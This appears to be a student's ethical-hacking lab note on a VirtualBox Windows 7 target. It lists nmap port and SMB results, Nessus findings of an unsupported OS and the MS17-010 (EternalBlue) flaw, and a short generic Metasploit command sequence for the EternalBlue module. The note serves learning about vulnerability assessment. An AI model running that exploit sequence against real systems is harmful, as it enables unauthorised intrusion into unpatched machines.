---
tags:
- blue
- Assessment
- Findings/Initial
- EH
MOC: IT
---
[[_0000 Home|Home]] | [[_0005 IT MOC|Back to IT MOC]] | [[EH AS Blue index|Back to index]]
# Ports
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds
	version 2.1
# OS version
OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)   
# Host Scripts (maybe useful)
	Host script results:
	| smb2-time: 
	|   date: 2025-09-19T11:22:34
	|_  start_date: 2025-09-19T11:13:59
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb-os-discovery: 
	|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1
	|   Computer name: WIN-845Q99OO4PP
	|   NetBIOS computer name: WIN-845Q99OO4PP\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-19T07:22:34-04:00
	| smb2-security-mode: 
	|   2:1:0: 
	|_    Message signing enabled but not required
	|_clock-skew: mean: 1h18m12s, deviation: 2h18m33s, median: -1m47s
	|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:2a:95:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nessus
### Critical vulneraility - Unsupported Windows OS
![[Screenshot from 2025-09-20 17-30-02.png]]
### High vulnerability -  MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)
![[Screenshot from 2025-09-20 17-30-52.png]]
![[Screenshot from 2025-09-20 17-31-06.png]]
    msf > use exploit/windows/smb/ms17_010_eternalblue
    msf exploit(ms17_010_eternalblue) > show targets
        ...targets...
    msf exploit(ms17_010_eternalblue) > set TARGET < target-id >
    msf exploit(ms17_010_eternalblue) > show options
        ...show and set options...
    msf exploit(ms17_010_eternalblue) > exploit